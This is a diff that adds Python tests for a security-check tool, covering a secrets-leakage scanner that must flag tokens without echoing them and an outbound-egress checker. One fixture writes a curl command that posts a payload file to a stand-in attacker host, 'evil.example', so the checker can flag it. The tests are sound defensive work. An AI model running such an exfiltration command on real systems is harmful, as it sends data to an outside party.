@@ -1851,6 +1851,124 @@ def test_code_malware_scan_includes_curated_sibling_repos(tmp_path, monkeypatch)
     assert "jarvis-forge" in result.metadata["missing_default_sibling_repos"]
 
 
+def test_secrets_leakage_scan_passes_clean_logs_and_events(tmp_path, monkeypatch):
+    logs = tmp_path / "logs"
+    logs.mkdir()
+    (logs / "alpha.log").write_text(
+        '{"message":"rotation complete","secret":"<redacted>"}\n',
+        encoding="utf-8",
+    )
+    monkeypatch.setenv("PORCHLIGHT_SECRET_LEAK_LOG_PATHS", str(logs))
+
+    result = porchlight.check_secrets_leakage_scan(
+        repo_root=tmp_path,
+        psql=lambda *_args, **_kwargs: porchlight.CommandResult(0, "", ""),
+    )
+
+    assert result.status == "pass"
+    assert result.metadata["log_files_scanned"] == 1
+    assert result.metadata["finding_count"] == 0
+
+
+def test_secrets_leakage_scan_fails_log_token_without_echoing_value(
+    tmp_path,
+    monkeypatch,
+):
+    token = "ghp_" + "A" * 36
+    logs = tmp_path / "logs"
+    logs.mkdir()
+    (logs / "alpha.log").write_text(
+        f"accidental auth header {token}\n",
+        encoding="utf-8",
+    )
+    monkeypatch.setenv("PORCHLIGHT_SECRET_LEAK_LOG_PATHS", str(logs))
+
+    result = porchlight.check_secrets_leakage_scan(
+        repo_root=tmp_path,
+        psql=lambda *_args, **_kwargs: porchlight.CommandResult(0, "", ""),
+    )
+
+    assert result.status == "fail"
+    assert result.severity == "critical"
+    assert "github_token_value" in result.detail
+    assert token not in result.detail
+    assert token not in json.dumps(result.metadata)
+
+
+def test_secrets_leakage_scan_fails_recent_agent_event_payload(tmp_path, monkeypatch):
+    logs = tmp_path / "logs"
+    logs.mkdir()
+    monkeypatch.setenv("PORCHLIGHT_SECRET_LEAK_LOG_PATHS", str(logs))
+    bearer = "Bearer " + "a" * 48
+    payload_b64 = base64.b64encode(
+        json.dumps({"notification": bearer}).encode()
+    ).decode()
+
+    def fake_psql(*_args, **_kwargs):
+        return porchlight.CommandResult(
+            0,
+            f"alpha_agent_events|event-1|payload|{payload_b64}\n",
+            "",
+        )
+
+    result = porchlight.check_secrets_leakage_scan(
+        repo_root=tmp_path,
+        psql=fake_psql,
+    )
+
+    assert result.status == "fail"
+    assert "alpha_agent_events:event-1:payload bearer_token_value" in result.detail
+    assert "a" * 48 not in json.dumps(result.metadata)
+
+
+def test_outbound_egress_drift_passes_allowed_hosts(tmp_path, monkeypatch):
+    gateway = tmp_path / "gateway"
+    gateway.mkdir()
+    (gateway / "client.py").write_text(
+        'URL = "https://api.github.com/repos/kphaas/jarvis-alpha"\n',
+        encoding="utf-8",
+    )
+    monkeypatch.setenv("PORCHLIGHT_EGRESS_SCAN_PATHS", str(gateway))
+
+    result = porchlight.check_outbound_egress_drift(repo_root=tmp_path)
+
+    assert result.status == "pass"
+    assert "api.github.com" in result.metadata["observed_hosts"]
+
+
+def test_outbound_egress_drift_fails_unknown_host(tmp_path, monkeypatch):
+    scripts = tmp_path / "scripts"
+    scripts.mkdir()
+    (scripts / "send.sh").write_text(
+        "curl -fsS https://evil.example/collect --data @payload.json\n",
+        encoding="utf-8",
+    )
+    monkeypatch.setenv("PORCHLIGHT_EGRESS_SCAN_PATHS", str(scripts))
+
+    result = porchlight.check_outbound_egress_drift(repo_root=tmp_path)
+
+    assert result.status == "fail"
+    assert result.severity == "high"
+    assert "evil.example" in result.detail
+    assert result.metadata["unapproved_hosts"] == ["evil.example"]
+
+
+def test_outbound_egress_drift_allows_configured_host(tmp_path, monkeypatch):
+    scripts = tmp_path / "scripts"
+    scripts.mkdir()
+    (scripts / "send.sh").write_text(
+        "curl -fsS https://new-provider.example/status\n",
+        encoding="utf-8",
+    )
+    monkeypatch.setenv("PORCHLIGHT_EGRESS_SCAN_PATHS", str(scripts))
+    monkeypatch.setenv("PORCHLIGHT_EGRESS_ALLOWED_HOSTS", "new-provider.example")
+
+    result = porchlight.check_outbound_egress_drift(repo_root=tmp_path)
+
+    assert result.status == "pass"
+    assert "new-provider.example" in result.metadata["observed_hosts"]
+
+
 def test_malware_scan_repo_freshness_refreshes_git_siblings(tmp_path, monkeypatch):
     alpha_root = tmp_path / "jarvis-alpha"
     alpha_root.mkdir()
